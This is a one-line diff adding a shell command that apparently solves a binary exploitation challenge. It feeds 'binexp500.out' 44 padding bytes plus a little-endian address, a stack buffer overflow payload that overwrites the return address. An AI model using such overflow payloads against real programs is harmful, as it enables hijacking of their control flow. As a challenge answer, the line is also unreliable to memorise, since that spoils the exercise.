@@ -1,0 +1,1 @@
+$ ./binexp500.out $(python -c 'print "A"*44+"\x4d\x84\x04\x08"')
